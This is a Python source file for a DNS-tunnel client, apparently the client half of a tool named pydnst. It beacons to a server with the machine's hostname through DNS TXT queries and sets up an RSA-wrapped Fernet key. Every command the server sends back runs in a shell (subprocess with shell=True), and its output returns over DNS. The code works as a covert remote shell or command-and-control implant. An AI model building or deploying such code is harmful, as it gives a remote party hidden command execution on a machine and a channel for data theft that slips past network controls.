import subprocess
from scapy.all import DNS, DNSQR, raw
import random
import os
import weakref
import socket
import time
import sys
import hashlib
import toml
from cryptography.fernet import Fernet as crypto_Fernet
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import serialization as crypto_serialization, hashes as crypto_hashes
from cryptography.exceptions import InvalidSignature as crypto_InvalidSignature

from .helpers import get_logger
from .message import MessageBuilder

logger = None
PATH_CONFIG = 'pydnst.toml'

EXPECT_ACK_TO_FRAGMENTS = True
SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION = False
SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION = SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION and EXPECT_ACK_TO_FRAGMENTS

SERVER_CLIENT_ID = '0'
KA_COMMAND_ID = '0'
RSA_COMMAND_ID = '1'
ACK_COMMAND_ID = '2'
COMMANDS_WITHOUT_ENCRYPTION = (KA_COMMAND_ID, RSA_COMMAND_ID, ACK_COMMAND_ID)
COMMANDS_WITHOUT_ACK = (KA_COMMAND_ID, ACK_COMMAND_ID)  #with REQUEST_NEXT_FROM_SERVER and REQUEST_RSA_KEY_HASH_FROM_SERVER

CONNECTION_TIMEOUT = 5
COMMAND_TIMEOUT = 60

REQUEST_NEXT_FROM_SERVER = b'nextpls'
REQUEST_RSA_KEY_HASH_FROM_SERVER = b'cfrmpls'

DR_NOT_READY = 'not_ready'
DR_NOT_READY_GOT_ACK = 'not_ready_got_ack'
DR_RSA_HANDSHAKE_COMPLETE = 'rsa_complete'    
DR_KA_ACK = 'ka_ack'
SOCKET_RESPONSE_TIMEOUT = 2

class DnstClient:

    def __init__(self):
        global logger
        logger = get_logger(logger_name='pydnst_client')
        
        if not os.path.exists(PATH_CONFIG):
            logger.info(f'No config file at {PATH_CONFIG}, leaving ...')
            sys.exit(1)    
        with open(PATH_CONFIG,'r') as fd:
            config_toml = toml.load(fd)
        self.DNST_SERVER_NAME = config_toml['general']['DNST_SERVER_NAME'].encode()
        self.DEFAULT_SHARED_KEY = config_toml['general']['DEFAULT_SHARED_KEY'].encode()
        config_client = config_toml['client']
        self.USE_DEFAULT_DNS_SERVER = config_client['USE_DEFAULT_DNS_SERVER']
        self.MAIN_INTERFACE = config_client['MAIN_INTERFACE']
        self.DNS_SERVER_ADDRESS_FALLBACK = config_client['DNS_SERVER_ADDRESS_FALLBACK']
        self.DNS_SERVER_ADDRESS = config_client['DNS_SERVER_ADDRESS']
        self.DNS_SERVER_PORT = config_client['DNS_SERVER_PORT']
        self.KEEP_ALIVE_PERIOD = config_client['KEEP_ALIVE_PERIOD']
        self.DNST_CLIENT_ID_PATH = config_client['DNST_CLIENT_ID_PATH']
        self.SERVER_PUBLIC_PEM_PATH = config_client['SERVER_PUBLIC_PEM_PATH']             
        
        if self.USE_DEFAULT_DNS_SERVER:
            try:
                self.DNS_SERVER_ADDRESS = subprocess.check_output(f"nmcli device show {self.MAIN_INTERFACE} |grep IP4.DNS | awk -F ' ' '{{ print $2 }}'", shell=True).strip().decode()
            except Exception:
                logger.warning(f'Cannot obtain {self.MAIN_INTERFACE} to find DNS address')
                self.DNS_SERVER_ADDRESS = self.DNS_SERVER_ADDRESS_FALLBACK
#        else:
#            self.DNS_SERVER_ADDRESS = DNS_SERVER_ADDRESS            
        
        try:
            if os.path.exists(self.DNST_CLIENT_ID_PATH):
                with open(self.DNST_CLIENT_ID_PATH, 'r') as fd:
                    self.client_id = min(int(fd.read().strip()), 255)
            else:
                self.client_id = str(random.randint(1,255))
                with open(self.DNST_CLIENT_ID_PATH, 'w') as fd:
                    fd.write(self.client_id)
                
            self.client_details = b'unknown'
            if os.path.exists('/etc/hostname'):
                with open('/etc/hostname', 'rb') as fd:
                    hostname = fd.read().strip()[:16]
                    if hostname:
                        self.client_details = hostname
            self.client_details = self.client_details[:13]
            self.server_address = (self.DNS_SERVER_ADDRESS, self.DNS_SERVER_PORT)
            self.is_server = False
            self.dnst_id = self.client_id
            self.transport = None
            self.message_builder = MessageBuilder(logger, weakref.proxy(self), self.DNST_SERVER_NAME, self.DEFAULT_SHARED_KEY)
            if self.message_builder.max_fragment_payload_sizes['request']['TXT'] < 1:
                logger.error(f'Cannot work with too long domain name {self.DNST_SERVER_NAME}')
                sys.exit(1)
            self.max_data_length = self.message_builder.max_data_length['request']
            self.received_fragments = {}    #key=client_id, value= {key=command_id, value={'date':'', 'list_of_fragments':[]}
            self.tunnel_messages = {}    #key=client_id, value= {key=command_id, value={'date':'', 'response':''}
                        
            self.server_public_key = None
            if os.path.exists(self.SERVER_PUBLIC_PEM_PATH):
                self.init_rsa_resources()
                
        except Exception:
            logger.exception('DnstClient')

    def init_rsa_resources(self):
        logger.info('Using a server public pem')
        with open(self.SERVER_PUBLIC_PEM_PATH, 'rb') as key_file:
            self.server_public_key = crypto_serialization.load_pem_public_key(
                key_file.read(),
                backend=crypto_default_backend()
            )
        logger.info('Generating shared key')
        self.shared_key = crypto_Fernet.generate_key()
        self.shared_key_encrypted = self.server_public_key.encrypt(
                self.shared_key,
                crypto_padding.OAEP(
                    mgf=crypto_padding.MGF1(algorithm=crypto_hashes.SHA256()),
                    algorithm=crypto_hashes.SHA256(),
                    label=None
                ))
        hasher = hashlib.sha256()
        hasher.update(self.shared_key)
        self.shared_key_hash = hasher.digest()
        self.tunnel_mng_messages = {RSA_COMMAND_ID:{}, ACK_COMMAND_ID:{}}
        self.rsa_handshake_complete = False        

    def datagram_received(self, data, addr):
        #returns True for valid response sent by server : command or ka
        #returns False otherwise
        try:
            dns_data = DNS(data)
            logger.info(f'datagram_received from {addr} : {data}')
            if not dns_data.an:
                logger.info('Received irrelevant message from server, our DNS server might not be answering')
                return False
            data_scapy = dns_data.an.rdata[0]
            logger.debug(f'Parsed datagram received : {DNS(data).show(dump=True)}')
            if dns_data.id != self.last_transaction_id_sent:
                logger.info('Received invalid transaction id answer from server, ignoring')
                return False
                
            res = self.message_builder.reassemble_fragment(data_scapy)
            if res is False:
                logger.info('Received invalid answer from server, our DNS server might not be answering')
                return False
            else:                
                client_id, command_id, fragment_id, number_of_fragments, is_ready = res
                
                if is_ready is not True:
                    logger.info(f'Asking for next fragment from server, by acking that fragment {fragment_id} out of {number_of_fragments} was successfully received')
                    try:
                        self.send_data(REQUEST_NEXT_FROM_SERVER + b'-'+ str(fragment_id).encode() + b'-'+str(random.randint(0,99)).encode(), command_id,
                                       rtype='TXT')
                    except Exception:
                        logger.exception('process_received_rsa InvalidSignature')
                    if command_id == ACK_COMMAND_ID:
                        return DR_NOT_READY_GOT_ACK
                    return DR_NOT_READY
                
                if command_id == ACK_COMMAND_ID:
                    try:
                        ack_fragment_index = int(self.tunnel_mng_messages[command_id].pop(client_id, b'').split(b'-')[0])
                        logger.info(f'Received ack response to fragment {ack_fragment_index} from server')
                        return ack_fragment_index  #True                        
                    except Exception:
                        logger.exception('ack_fragment_index')
                        return True                        
                    
                elif command_id == KA_COMMAND_ID:
                    logger.info('Received keep-alive response from server')
                    return DR_KA_ACK
                
                elif command_id == RSA_COMMAND_ID:
                    logger.info('Received rsa response from server')
                    res = self.process_received_rsa(self.tunnel_mng_messages[command_id].pop(client_id, b''))
                    #if res:
                    return res
                else:
                    received_message = self.tunnel_messages[client_id][command_id]                    
                    logger.info(f'Received command id {command_id} from server : {received_message}')                
                    self.process_received_command(received_message['response'], command_id)
            return True
        except Exception:
            logger.exception('datagram_received')
            return False
    
    def process_received_rsa(self, received_message):
        logger.info('Verifying that server returned correct shared_key_hash')
        try:
            self.server_public_key.verify(
                received_message,
                self.shared_key_hash,
                crypto_padding.PSS(
                    mgf=crypto_padding.MGF1(crypto_hashes.SHA256()),
                    salt_length=crypto_padding.PSS.MAX_LENGTH
                ),
                crypto_hashes.SHA256()
            )
            self.rsa_handshake_complete = True
            logger.info('Server returned valid shared_key_hash, rsa handshake is complete')
            self.message_builder.use_shared_key_for_client(SERVER_CLIENT_ID, self.shared_key)
            return DR_RSA_HANDSHAKE_COMPLETE
        except crypto_InvalidSignature:
            logger.info('Server returned invalid shared_key_hash, sending it again')
            try:
                self.rsa_handshake_complete = False
                self.send_data(self.shared_key_encrypted, RSA_COMMAND_ID, rtype='TXT')
                if not SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION:
                    #no wait for server hash confirmation, send ka now
                    self.rsa_handshake_complete = True
                    return True
                #client will receive the server hash confirmation in the next loops of "while res == DR_NOT_READY" in loop_keep_alives
                return DR_NOT_READY
            except Exception:
                logger.exception('process_received_rsa InvalidSignature')
        except Exception:
            logger.exception('process_received_rsa')
    
    def process_received_command(self, received_message, command_id):
        logger.info(f'Processing command id {command_id} : {received_message}')
        try:
            proc = subprocess.run(received_message, shell=True, timeout=COMMAND_TIMEOUT,
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.returncode != 0:
                logger.error(f'Error while executing command {command_id} : {proc.stdout}')
            stdout = proc.stdout.strip()
            logger.info(f'Sending response id {command_id} : {stdout}')
            self.send_data(stdout, command_id)  
        except Exception:
            logger.exception('process_received_command')


    def send_data(self, data, command_id, rtype='TXT', without_encryption=False):
        logger.info(f'Sending data of length {len(data)}')
        if command_id in COMMANDS_WITHOUT_ENCRYPTION:
            without_encryption = True        
        if len(data) > self.max_data_length:
            logger.info(f'Truncating data of length {len(data)} to {self.max_data_length}')
            data = data[:self.max_data_length]
        fragments = self.message_builder.fragmenter(data, rtype, SERVER_CLIENT_ID, command_id, is_dns_response=False,
                                                    without_encryption=without_encryption)

        expect_ack = False
        if EXPECT_ACK_TO_FRAGMENTS:
            expect_ack = True
            if command_id in COMMANDS_WITHOUT_ACK:
                expect_ack = False
            elif data.startswith(REQUEST_NEXT_FROM_SERVER):
                expect_ack = False
            elif data.startswith(REQUEST_RSA_KEY_HASH_FROM_SERVER):
                expect_ack = False
                
        self.send_fragments(fragments, rtype, command_id, expect_ack)


    def send_fragments(self, fragments, rtype, command_id, expect_ack):
        #This fragment expects a ACK in case EXPECT_ACK_TO_FRAGMENTS and command_id not in COMMANDS_WITHOUT_ACK
        #in that case, for each fragment we open and then close a socket
        #otherwise, we just open a socket to send the fragment, without closing it (since a response will be expected)
        
        number_of_fragments = len(fragments)
        index = 1
            
        if expect_ack:
            while index <= number_of_fragments:
                fragment = fragments[index-1]
                logger.info(f'Sending fragment {index} out of {number_of_fragments}')
                res = self.sock_connect()                        
                if res is False:
                    time.sleep(SOCKET_RESPONSE_TIMEOUT)
                    continue
                
                self.send_message(fragment, rtype)
                
                #this prevents ICMP messages when not listening to the response
                try:
                    logger.info('Waiting for ack')
                    self.sock.settimeout(SOCKET_RESPONSE_TIMEOUT)                    
                    received_data, remote_address = self.sock.recvfrom(4096)
                    self.sock.settimeout(None)
                except socket.timeout:
                    logger.info(f'Timeout, resending fragment index {index}')
                    self.sock.close()
                    continue
                logger.info(f'Maybe received ack to fragment {index} out of {number_of_fragments}')
                res = self.datagram_received(received_data, remote_address)
                if res is True or (res == index):
                    index += 1
                else:
                    #if got ack for another fragment, ignore it and send again                        
                    logger.info(f'Ignoring ack index {res} after sending fragment index {index}')
                self.sock.close()
        else:
            res = self.sock_connect()            
            if res is False:
                return
            for fragment in fragments:
                logger.info(f'Sending fragment {index} out of {number_of_fragments}')
                self.send_message(fragment, rtype)
                index += 1


    def send_message(self, dns_data, rtype):
        transaction_id = random.randint(0,65536)
        data_scapy = DNS(id=transaction_id, rd=1, qd=DNSQR(qname=dns_data, qtype=rtype))
        message = raw(data_scapy)
        logger.info(f'Sending message {message}, with id {transaction_id}, with data {dns_data}, and type {rtype}')
        logger.debug(f'Using query qd {data_scapy.show(dump=True)}')
        self.last_transaction_id_sent = transaction_id
        self.sock.sendto(message, self.server_address)

    def sock_connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(CONNECTION_TIMEOUT)
        
        try:
            logger.info('Trying new connection to DNS server')
            self.sock.connect(self.server_address)
        except socket.timeout:
            logger.warning(f'Could not connect to DNS server') #, sleeping {CONNECTION_TIMEOUT}s')
            self.sock.close()
            #time.sleep(CONNECTION_TIMEOUT)
            return False
        return True
                
    def send_keep_alive(self):    
        logger.info('Sending keep-alive')
        #we enforce keep-alive to occupy only 1 fragment, by limiting the client_details size
        #keep-alive is defined by : command_id = 0
        keep_alive_content = self.client_details + b'-'+str(random.randint(0,99)).encode()
        keep_alive_content = keep_alive_content[:16]   #must be smaller than 16 to occupy only 1 fragment
        self.send_data(keep_alive_content, KA_COMMAND_ID, rtype='TXT')
    
    def loop_keep_alives(self):
        logger.info('Starting loop_keep_alives')                      
        while True:                                 
            try:              
                if self.server_public_key:
                    if not self.rsa_handshake_complete:                        
                        logger.info('Sending shared_key_encrypted')
                        self.send_data(self.shared_key_encrypted, RSA_COMMAND_ID, rtype='TXT')
                        
                        if SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION:

                            logger.info('Sending request for shared_key_encrypted ack from server')
                            #use ACK_COMMAND_ID to not close the socket and not expect ack from server (also to not encode this message and to send it in 1 fragment)
                            self.send_data(REQUEST_RSA_KEY_HASH_FROM_SERVER + b'-'+str(random.randint(0,99)).encode(), RSA_COMMAND_ID,
                                   rtype='TXT')                                    
                            logger.info('Waiting for rsa shared key confirmation or bad response or timeout')
                            
                            res = DR_NOT_READY
                            while res == DR_NOT_READY:
                                try:
                                    self.sock.settimeout(SOCKET_RESPONSE_TIMEOUT)                    
                                    received_data, remote_address = self.sock.recvfrom(4096)
                                    self.sock.settimeout(None)
                                except socket.timeout:
                                    self.sock.close()
                                    time.sleep(SOCKET_RESPONSE_TIMEOUT)
                                    continue
                                logger.info('Received new rsa message from DNS server')
                                res = self.datagram_received(received_data, remote_address)
                                if res == DR_NOT_READY:
                                    continue
                                elif res is False or (res == DR_NOT_READY_GOT_ACK) or (res == 1):
                                    #something's weird, we receive ack instead of hash key confirmation, request again
                                    #res=1 in case we received an ack single fragment
                                    logger.info('Sending AGAIN request for shared_key_encrypted ack from server')
                                    #use ACK_COMMAND_ID to not close the socket and not expect ack from server (also to not encode this message and to send it in 1 fragment)
                                    self.sock.close()
                                    self.send_data(REQUEST_RSA_KEY_HASH_FROM_SERVER + b'-'+str(random.randint(0,99)).encode(), RSA_COMMAND_ID,
                                                   rtype='TXT')
                                    res = DR_NOT_READY
                                    continue
                                    
                                elif res == DR_RSA_HANDSHAKE_COMPLETE:
                                    self.sock.close()
                                    break    #we want to send ka asap now
                                #if res is False:
                                else:
                                    res = DR_NOT_READY    #ignore bad stuff coming from dns server
                        else:
                            time.sleep(2)
                            logger.info('Assuming rsa handshake is complete (configured without server confirmation)')
                            self.rsa_handshake_complete = True
                            self.message_builder.use_shared_key_for_client(SERVER_CLIENT_ID, self.shared_key)

                self.send_keep_alive()
                    
                res = DR_NOT_READY
                send_ka_now = False
                while res == DR_NOT_READY:
                    try:
                        logger.info('Waiting for ka response or bad response or timeout')
                        self.sock.settimeout(SOCKET_RESPONSE_TIMEOUT)                    
                        received_data, remote_address = self.sock.recvfrom(4096)
                        self.sock.settimeout(None)
                    except socket.timeout:
                        self.sock.close()
                        break
                    logger.info('Received new message from DNS server')
                    self.sock.close()
                    res = self.datagram_received(received_data, remote_address)
                    if res == True:
                        send_ka_now = True
                        break
                    elif res == DR_KA_ACK:
                        break
                    if res is False:
                        res = DR_NOT_READY    #ignore bad stuff coming from dns server

                if send_ka_now:
                    continue
                time.sleep(self.KEEP_ALIVE_PERIOD)                
            except Exception:
                logger.exception('loop_keep_alives')
            
    def run(self):
        try:
            logger.info(f'DnstClient started with DNS server {self.DNS_SERVER_ADDRESS}, client_id {self.client_id}, and client_details {self.client_details}')
            self.loop_keep_alives()

        except Exception:
            logger.exception('run')
        except:
            logger.info('DnstClient stopped')
    

